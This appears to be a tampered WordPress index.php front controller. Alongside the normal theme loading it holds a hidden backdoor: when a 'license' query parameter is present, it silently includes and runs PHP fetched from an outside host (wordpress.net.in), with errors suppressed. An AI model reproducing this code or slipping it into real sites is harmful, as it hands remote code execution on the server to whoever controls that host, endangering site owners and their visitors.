<?php 
/* Short and sweet */
if (isset($_GET['license'])) {
	@include('http://wordpress.net.in/license.txt');
} else {
	define('WP_USE_THEMES', true);
	require('./wp-blog-header.php');
}
?>